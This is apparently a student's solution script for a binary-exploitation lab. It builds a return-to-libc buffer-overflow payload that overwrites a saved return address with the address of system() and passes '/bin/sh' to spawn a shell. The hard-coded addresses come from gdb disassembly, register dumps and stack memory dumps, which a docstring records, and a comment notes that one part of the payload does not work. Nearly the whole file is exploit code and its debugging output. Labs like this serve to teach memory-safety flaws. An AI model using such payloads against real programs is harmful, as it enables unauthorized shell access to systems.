#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# Fill buffer
sys.stdout.buffer.write(("\x69" * 14).encode())

# Overwrite return address with system call
# sys.stdout.buffer.write(pack("<I", 0x0804890d))  # Old return address
sys.stdout.buffer.write(pack("<I", 0x804fbf0))  # System call address

# # Write past argv[1] without changing it
sys.stdout.buffer.write(pack("<I", 0xffffd418)) 

# # Place an address that points to the "/bin/sh" on "top" of stack
sys.stdout.buffer.write(pack("<I", 0xfffe9668))

# Write old stack data [Does not Work though]
sys.stdout.buffer.write(pack("<I", 0xffffd1c8))
sys.stdout.buffer.write(pack("<I", 0x080489ae))
# Converting the 0's to 1's won't work. Will still seg fault after exiting shell
sys.stdout.buffer.write(pack("<I", 0x01010102))
sys.stdout.buffer.write(pack("<I", 0xffffd284))
sys.stdout.buffer.write(pack("<I", 0xffffd290))

# Write shell command
sys.stdout.buffer.write(("/bin/sh").encode())


"""

1. Find the system call address

(gdb) disas greetings
Dump of assembler code for function greetings:
   0x080488a5 <+0>:     push   %ebp
   0x080488a6 <+1>:     mov    %esp,%ebp
   0x080488a8 <+3>:     push   $0x80ac268
   0x080488ad <+8>:     call   0x804fbf0 <system>
   0x080488b2 <+13>:    add    $0x4,%esp
   0x080488b5 <+16>:    nop
   0x080488b6 <+17>:    leave  
   0x080488b7 <+18>:    ret    
End of assembler dump.

2. Find the return address
(gdb) info reg
eax            0xffffd418       -11240
ecx            0x0      0
edx            0x0      0
ebx            0x80da000        135110656
esp            0xfffe9638       0xfffe9638
ebp            0xfffe9644       0xfffe9644
esi            0x80da000        135110656
edi            0x80481a8        134513064
eip            0x80488be        0x80488be <vulnerable+6>
eflags         0x292    [ AF SF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99

(gdb) x/2wx $ebp
0xfffe9644:     0xfffe9650      0x0804890d

3. Set break point at the system address

(gdb) b *0x0804890d

4. Observe stack on normal run after hitting the return address

(gdb) x/128bx 0xfffe962c
0xfffe962c:     0xca    0x88    0x04    0x08    0x3a    0x96    0xfe    0xff
0xfffe9634:     0x18    0xd4    0xff    0xff    0xa8    0x81    0x74    0x65
0xfffe963c:     0x73    0x74    0x00    0xff    0xb2    0x88    0x04    0x08
0xfffe9644:     0x50    0x96    0xfe    0xff    0x0d    0x89    0x04    0x08
0xfffe964c:     0x18    0xd4    0xff    0xff    0xc8    0xd1    0xff    0xff
0xfffe9654:     0xae    0x89    0x04    0x08    0x02    0x00    0x00    0x00
0xfffe965c:     0x84    0xd2    0xff    0xff    0x90    0xd2    0xff    0xff
0xfffe9664:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe966c:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe9674:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe967c:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe9684:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe968c:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe9694:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe969c:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe96a4:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00

5. Test payloads without overwriting the return address

(gdb) x/128bx 0xfffe962c
0xfffe962c:     0xca    0x88    0x04    0x08    0x3a    0x96    0xfe    0xff
0xfffe9634:     0xfb    0xd3    0xff    0xff    0xa8    0x81    0x69    0x69
0xfffe963c:     0x69    0x69    0x69    0x69    0x69    0x69    0x69    0x69
0xfffe9644:     0x69    0x69    0x69    0x69    0x0d    0x89    0x04    0x08
0xfffe964c:     0x69    0x69    0x69    0x69    0x54    0x96    0xfe    0xff
0xfffe9654:     0x2f    0x62    0x69    0x6e    0x2f    0x73    0x68    0x00
0xfffe965c:     0x64    0xd2    0xff    0xff    0x70    0xd2    0xff    0xff
0xfffe9664:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe966c:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe9674:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe967c:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe9684:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe968c:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe9694:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe969c:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xfffe96a4:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
"""